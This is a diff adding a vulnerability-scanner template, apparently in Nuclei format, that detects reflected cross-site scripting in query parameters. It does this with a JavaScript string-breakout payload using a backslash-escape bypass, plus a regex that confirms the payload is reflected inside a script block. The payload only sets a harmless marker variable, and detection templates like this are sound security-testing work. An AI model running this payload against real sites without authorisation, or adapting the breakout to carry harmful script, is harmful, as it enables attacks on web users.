@@ -1,0 +1,40 @@
+id: ptflow-xss-js-backslash-query
+
+info:
+  name: Reflected XSS JavaScript Backslash Bypass via Query Parameter
+  author: ptflow
+  severity: medium
+  description: Confirms JavaScript string breakout from a query value when a quote is escaped but its backslash is not.
+  metadata:
+    max-request: 1
+    verified: true
+  tags: ptflow,dast,xss,stable,fuzzing-req-query
+
+http:
+  -
+    pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+
+    fuzzing:
+      - part: query
+        mode: single
+        type: postfix
+        fuzz:
+          - "\\'-(window.ptflow_xss_7919=7919)//"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: content_type
+        words:
+          - text/html
+      - type: regex
+        part: body
+        regex:
+          - '(?s)<script[^>]*>[^<]{0,1000}\\\\''-\(window\.ptflow_xss_7919=7919\)//[^<]{0,1000}</script>'
